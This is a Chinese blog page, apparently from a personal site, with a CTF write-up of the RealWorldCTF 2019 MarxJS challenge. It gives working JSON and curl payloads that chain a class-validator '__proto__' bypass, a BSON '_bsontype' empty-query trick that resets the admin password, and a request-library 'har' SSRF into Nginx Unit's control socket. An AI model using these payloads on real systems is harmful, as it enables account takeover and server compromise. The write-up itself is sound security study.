@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/03/eurosys-2019-lockdoc/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/03/realworldctf-2019-marxjs/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           RealWorldCTF 2019 MarxJS | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="RealWorldCTF 2019 MarxJS | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "RealWorldCTF 2019 MarxJS",
+    "headline" : "RealWorldCTF 2019 MarxJS",
+    "description" : "看了 wupco 师傅关于 nodejs 安全的总结：本人在2019年对一些NodeJS问题的研究，结合他在 RealWorld CTF 上出的题来深入学习一下。 MarxJS 首先看附件里的文件，real",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-03-10 00:03:36 \x2b0800 CST",
+    "dateModified" : "2020-03-10 00:03:36 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/03\/realworldctf-2019-marxjs\/",
+    "wordCount" : "1963",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">RealWorldCTF 2019 MarxJS</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-03-10 itemprop="datePublished">March 10, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        <a href="https://syang-ng.github.io/categories/web/"> Web </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>看了 wupco 师傅关于 nodejs 安全的总结：<a href="https://xz.aliyun.com/t/7237">本人在2019年对一些NodeJS问题的研究</a>，结合他在 RealWorld CTF 上出的题来深入学习一下。</p>
+<h2 id="marxjs">MarxJS</h2>
+<p>首先看附件里的文件，<code>real-world-cms/src/app/app.controller.ts</code> 里有一段初始化 admin 的代码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">async</span> <span style="color:#a6e22e">init</span>() {
+  <span style="color:#66d9ef">try</span> {
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">getMongoRepository</span>(<span style="color:#a6e22e">User</span>).<span style="color:#a6e22e">clear</span>();
+  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>);
+  }
+  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>();
+  <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">email</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin@realworldctf.com&#39;</span>;
+  <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">isAdmin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">generateToken</span>();
+  <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">setPassword</span>(<span style="color:#a6e22e">password</span>);
+  <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">getMongoRepository</span>(<span style="color:#a6e22e">User</span>).<span style="color:#a6e22e">save</span>(<span style="color:#a6e22e">user</span>);
+}
+</code></pre></div><p>可以看到 admin 账户的密码是随机生成的 token，那么题目第一步必然是泄露出该密码。</p>
+<p>继续定位到 <code>real-world-cms/src/app/controllers/resetpass.controller.ts</code>，可以看到这里提供了重置密码的功能：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Email</span> {
+    <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">IsEmail</span>()
+    <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">IsNotEmpty</span>()
+    <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>;
+}
+
+<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ResetpassController</span> {
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">Post</span>()
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">ValidateBody</span>(<span style="color:#a6e22e">Email</span>)
+  <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">resetpass</span>(<span style="color:#a6e22e">ctx</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Context</span>) {
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">getMongoRepository</span>(<span style="color:#a6e22e">User</span>).<span style="color:#a6e22e">findOne</span>({ <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span> });
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) {
+          <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HttpResponseBadRequest</span>(<span style="color:#e6db74">&#39;user not found&#39;</span>);
+      }
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">newpass</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">generateToken</span>();
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">passhash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">hashPassword</span>(<span style="color:#a6e22e">newpass</span>);
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">getMongoRepository</span>(<span style="color:#a6e22e">User</span>).<span style="color:#a6e22e">updateOne</span>(
+        { <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span> }, { <span style="color:#a6e22e">$set</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">passhash</span>}});
+      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">res</span>) {
+          <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HttpResponseInternalServerError</span>(<span style="color:#e6db74">&#39;something error.&#39;</span>);
+      }
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">transporter</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createTransport</span>(
+        <span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;mailserver&#39;</span>)
+     );
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> {
+      <span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Config</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;mailfrom&#39;</span>),
+      <span style="color:#a6e22e">to</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">email</span>,
+      <span style="color:#a6e22e">subject</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;[😁] New password&#39;</span>,
+      <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Your new password: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">newpass</span>
+
+    };
+
+      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">transporter</span>.<span style="color:#a6e22e">sendMail</span>(<span style="color:#a6e22e">message</span>);
+      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HttpResponseRedirect</span>(<span style="color:#e6db74">&#39;/signin&#39;</span>);
+  }
+    <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">Get</span>()
+    <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">index</span>(<span style="color:#a6e22e">ctx</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Context</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;templates/resetpass.html&#39;</span>);
+    }
+
+}
+</code></pre></div><p>这里需要解决两个问题：</p>
+<ol>
+<li>伪造 email 的内容，但通过 <code>@ValidateBody(Email)</code> 的检查。</li>
+<li>构造 email 对象，使得 findOne() 返回的是 admin 对象，而且能正常触发 <code>transporter.sendMail(message)</code> 的逻辑。</li>
+</ol>
+<p>这里引用一下 wupco 师傅的原话：</p>
+<blockquote>
+<p>发现是由于在bson序列化的过程中，他传入的是一个不存在的_bsontype，然后在那些分支都走过之后，因为没有对应的bsontype，所以最终没有序列化任何query，于是造成了<strong>findone({})这种查询条件为空的情况，成功选中第一个用户</strong></p>
+<p>这个Bug十分有意义。例如在一个找回密码的场景，需要输入一个比较特别的id的时候<code>findone({&quot;userid&quot;:userinput)</code>
+这时候我们就可以利用这个技巧，让查询语句变成<code>findone({})</code>，从而更改第一个用户的密码，而第一个用户大多是admin用户。</p>
+</blockquote>
+<blockquote>
+<p>通过审计nodemailer(<a href="https://github.com/nodemailer/nodemailer">https://github.com/nodemailer/nodemailer</a>)的代码，我发现如果<code>to</code>这个object存在<code>address</code>这个属性，那么就会向<code>address</code>对应的地址发送邮件。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// https://github.com/nodemailer/nodemailer/blob/master/lib/mime-node/index.js   
+</span><span style="color:#75715e"></span> <span style="color:#a6e22e">_parseAddresses</span>(<span style="color:#a6e22e">addresses</span>) {
+     <span style="color:#66d9ef">return</span> [].<span style="color:#a6e22e">concat</span>.<span style="color:#a6e22e">apply</span>(
+         [],
+         [].<span style="color:#a6e22e">concat</span>(<span style="color:#a6e22e">addresses</span>).<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">address</span> =&gt; {
+             <span style="color:#75715e">// eslint-disable-line prefer-spread
+</span><span style="color:#75715e"></span>             <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">address</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">address</span>) {
+                 <span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">address</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_normalizeAddress</span>(<span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">address</span>);
+                 <span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;&#39;</span>;
+                 <span style="color:#66d9ef">return</span> [<span style="color:#a6e22e">address</span>];
+             }
+             <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addressparser</span>(<span style="color:#a6e22e">address</span>);
+         })
+     );
+ }
+</code></pre></div></blockquote>
+<blockquote>
+<p>class-validator这个数据类型检测器被广泛使用在各个Web框架里，通常与Body解析器构成触发式验证。但是如果Body中存在<strong>proto</strong>这个键的话，就会直接跳过验证。</p>
+</blockquote>
+<p>综合这三段话，我们就可以构造出这样一条攻击链：构造 email 为 object，利用 <code>__proto__</code> 绕过 <code>@ValidateBody(Email)</code> 检测，然后利用不存在的 _bsontype 使得返回选中第一个用户（admin），然后利用 <code>to</code> 的 <code>address</code> 属性触发邮件逻辑。最终构造出的对象如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;email&#34;</span>:{
+    <span style="color:#f92672">&#34;address&#34;</span>: <span style="color:#e6db74">&#34;test@example.com&#34;</span>,
+    <span style="color:#f92672">&#34;_bsontype&#34;</span>: <span style="color:#e6db74">&#34;abcd&#34;</span>
+  },
+  <span style="color:#f92672">&#34;__proto__&#34;</span>:{}
+}
+</code></pre></div><p>可以看到成功重置了 admin 的密码：</p>
+<p><img src="/images/posts/RealWorldCTF-2019-MarxJS/resetpass.png" alt="resetpass"></p>
+<p>以 admin 用户身份登录之后即可访问 admin 页面，根据代码可知该页面有如下功能：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">export</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Url</span> {
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">IsUrl</span>()
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">IsNotEmpty</span>()
+  <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">string</span>;
+}
+<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AdminController</span> {
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">dependency</span>
+  <span style="color:#a6e22e">store</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MongoDBStore</span>;
+  <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">boolean</span>;
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">Post</span>()
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">TokenRequired</span>({
+    <span style="color:#a6e22e">cookie</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+    <span style="color:#a6e22e">extendLifeTimeOrUpdate</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+    <span style="color:#a6e22e">redirectTo</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/signin&#39;</span>,
+    <span style="color:#a6e22e">store</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MongoDBStore</span>,
+  })
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">AdminRequired</span>()
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">ValidateBody</span>(<span style="color:#a6e22e">Url</span>)
+  <span style="color:#a6e22e">async</span> <span style="color:#a6e22e">checkstatus</span>(<span style="color:#a6e22e">ctx</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Context</span>) {
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">rp</span>.<span style="color:#a6e22e">head</span>(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">url</span>).<span style="color:#a6e22e">then</span>(() =&gt; { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>; },
+        () =&gt; { <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>; } );
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">HttpResponseRedirect</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;/admin?alive=true&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/admin?error=true&#39;</span>);
+  }
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">Get</span>()
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">TokenRequired</span>({
+    <span style="color:#a6e22e">cookie</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+    <span style="color:#a6e22e">extendLifeTimeOrUpdate</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+    <span style="color:#a6e22e">redirectTo</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;/signin&#39;</span>,
+    <span style="color:#a6e22e">store</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">MongoDBStore</span>,
+  })
+  <span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">AdminRequired</span>()
+  <span style="color:#a6e22e">index</span>(<span style="color:#a6e22e">ctx</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Context</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;templates/admin.html&#39;</span>);
+  }
+}
+</code></pre></div><p>可以看到该页面最主要的是提供了利用 HEAD 请求验证服务器状态的功能，这里的漏洞，继续引用 wupco 师傅的原文：</p>
+<blockquote>
+<p><a href="https://github.com/request/request">https://github.com/request/request</a>
+request库存在参数har可以覆盖请求方式等参数。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">Har</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">options</span>) {
+<span style="color:#75715e">// skip if no har property defined
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">har</span>) {
+ <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">options</span>
+}
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">har</span> <span style="color:#f92672">=</span> {}
+<span style="color:#a6e22e">extend</span>(<span style="color:#a6e22e">har</span>, <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">har</span>)
+<span style="color:#75715e">// ……
+</span></code></pre></div></blockquote>
+<p>进行尝试：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl --location --request POST <span style="color:#e6db74">&#39;http://127.0.0.1:13333/admin&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--header <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--header <span style="color:#e6db74">&#39;Cookie:  sessionID=7yaOM9trjwk5Ipb4ovWl9F3Ql8Brq8XNsa9U5g8SiI8.6eMCDRfu9SZG7hSs6GJz-ojbTcSNQUTE1GF6h0-cvO0&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--data-raw <span style="color:#e6db74">&#39;{
+</span><span style="color:#e6db74">	&#34;url&#34;: {
+</span><span style="color:#e6db74">		&#34;uri&#34;: &#34;http://vps_ip&#34;,
+</span><span style="color:#e6db74">		&#34;har&#34;: {
+</span><span style="color:#e6db74">			&#34;method&#34;: &#34;POST&#34;
+</span><span style="color:#e6db74">		}
+</span><span style="color:#e6db74">	},
+</span><span style="color:#e6db74">	&#34;__proto__&#34;: {}
+</span><span style="color:#e6db74">}&#39;</span>
+</code></pre></div><p>可以看到 vps 上的结果如下：</p>
+<p><img src="/images/posts/RealWorldCTF-2019-MarxJS/access.png" alt="access"></p>
+<p>下面则是下一个问题，既然我们能够修改 request 请求了，那么这里存在着一个 SSRF 问题，利用 SSRF，我们能做什么？</p>
+<p>此时看到 run.sh 里有一条很有意思的命令：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -X PUT --data-binary @unit.config.json --unix-socket /var/run/control.unit.sock http://localhost/config/
+</code></pre></div><p>查询资料可以知道本题使用了 Nginx Unit，以 Nginx 为基础的开源的动态 Web 应用服务器，根据官网上的文档：</p>
+<blockquote>
+<p>Unit accepts requests at the specified IP and port, passing them to the application process. Your app works!</p>
+<p>Finally, check the resulting configuration:</p>
+<pre><code># curl --unix-socket /path/to/control.unit.sock http://localhost/config/
+
+    {
+        &quot;listeners&quot;: {
+            &quot;127.0.0.1:8300&quot;: {
+                &quot;pass&quot;: &quot;applications/blogs&quot;
+            }
+        },
+
+        &quot;applications&quot;: {
+            &quot;blogs&quot;: {
+                &quot;type&quot;: &quot;php&quot;,
+                &quot;root&quot;: &quot;/www/blogs/scripts/&quot;
+            }
+        }
+    }
+</code></pre></blockquote>
+<p>结合本题提供的 json 文件，可以确认服务器的配置方式：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;listeners&#34;</span>: {
+    <span style="color:#f92672">&#34;0.0.0.0:13333&#34;</span>: {
+      <span style="color:#f92672">&#34;pass&#34;</span>: <span style="color:#e6db74">&#34;applications/realworldcms&#34;</span>
+    }
+  },
+  <span style="color:#f92672">&#34;applications&#34;</span>:{
+    <span style="color:#f92672">&#34;realworldcms&#34;</span>:{
+      <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;external&#34;</span>,
+      <span style="color:#f92672">&#34;working_directory&#34;</span>: <span style="color:#e6db74">&#34;/app/real-world-cms/&#34;</span>,
+      <span style="color:#f92672">&#34;executable&#34;</span>: <span style="color:#e6db74">&#34;build/index.js&#34;</span>
+    }
+  }
+}
+</code></pre></div><p>结合 Unit 的功能，很容易就能想到构造出如下配置，使得我们访问即可得到 flag：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;listeners&#34;</span>: {
+    <span style="color:#f92672">&#34;0.0.0.0:13333&#34;</span>: {
+      <span style="color:#f92672">&#34;pass&#34;</span>: <span style="color:#e6db74">&#34;applications/flag&#34;</span>
+    }
+  },
+  <span style="color:#f92672">&#34;applications&#34;</span>:{
+    <span style="color:#f92672">&#34;flag&#34;</span>:{
+      <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;php&#34;</span>,
+      <span style="color:#f92672">&#34;root&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
+      <span style="color:#f92672">&#34;index&#34;</span>: <span style="color:#e6db74">&#34;flag&#34;</span>
+    }
+  }
+}
+</code></pre></div><p>切入 docker，尝试一下，发现修改成功：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -X PUT --data-binary @test.json --unix-socket /var/run/control.unit.sock http://localhost/config/
+</code></pre></div><p><img src="/images/posts/RealWorldCTF-2019-MarxJS/unit-result.png" alt="rusult"></p>
+<p>那么下一步思考的问题则是，如何结合 request 的漏洞来达到写入配置 json 的目的？</p>
+<p>阅读 node 的 request 文档，可以看到对 unix 相关请求的支持：</p>
+<blockquote>
+<h2 id="unix-domain-sockets">UNIX Domain Sockets</h2>
+<p><code>request</code> supports making requests to <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">UNIX Domain Sockets</a>. To make one, use the following URL scheme:</p>
+<pre><code>/* Pattern */ 'http://unix:SOCKET:PATH'
+/* Example */ request.get('http://unix:/absolute/path/to/unix.socket:/request/path')
+</code></pre></blockquote>
+<p>所以 <code>--unix-socket /var/run/control.unit.sock http://localhost/config/</code> 可转换为 <code>http://unix:/var/run/control.unit.sock:/config/</code>，最终 exp 如下：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl --location --request POST <span style="color:#e6db74">&#39;http://127.0.0.1:13333/admin&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--header <span style="color:#e6db74">&#39;Cookie:  sessionID=tHCEbykkFf2ukGvoRnVo8mKwMlBvN-mxy3019E3mhO8.xAAshotg9zFIUmia5eRtTLDQBwzhmeGX4n0JMDj_eP4&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--header <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>--data-raw <span style="color:#e6db74">&#39;{
+</span><span style="color:#e6db74">	&#34;url&#34;: {
+</span><span style="color:#e6db74">                &#34;uri&#34;: &#34;http://unix:/var/run/control.unit.sock:/config/&#34;,
+</span><span style="color:#e6db74">                &#34;har&#34;: {
+</span><span style="color:#e6db74">                        &#34;method&#34;: &#34;PUT&#34;,
+</span><span style="color:#e6db74">                        &#34;postData&#34;: {
+</span><span style="color:#e6db74">                                &#34;text&#34;: &#34;{\&#34;listeners\&#34;:{\&#34;0.0.0.0:13333\&#34;:{\&#34;pass\&#34;:\&#34;applications/flag\&#34;}},\&#34;applications\&#34;:{\&#34;flag\&#34;:{\&#34;type\&#34;:\&#34;php\&#34;,\&#34;root\&#34;:\&#34;/\&#34;,\&#34;index\&#34;:\&#34;flag\&#34;}}}&#34;,
+</span><span style="color:#e6db74">                                &#34;mimeType&#34;: &#34;application/json&#34;
+</span><span style="color:#e6db74">                        }
+</span><span style="color:#e6db74">                }
+</span><span style="color:#e6db74">        },
+</span><span style="color:#e6db74">	&#34;__proto__&#34; : {}
+</span><span style="color:#e6db74">}&#39;</span>
+</code></pre></div><p><img src="/images/posts/RealWorldCTF-2019-MarxJS/flag.png" alt="flag"></p>
+<p>PS：佛了，调了一上午发现是 docker 里权限不大对，ctf 用户访问不了 /var/run/control.unit.sock 导致的 error</p>
+<h2 id="总结">总结</h2>
+<ol>
+<li>nodejs 很多库其实存在着很多实现上的疏忽（不一定称得上漏洞），利用这种疏忽可以达到巧妙的效果。</li>
+<li><code>__proto__</code>  属性实乃 javascript 一大坑点，不过某种意义上也是找洞的机会所在？</li>
+</ol>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li><a href="https://christa.top/details/52/">Realword Final 2019 Marxjs 学习</a></li>
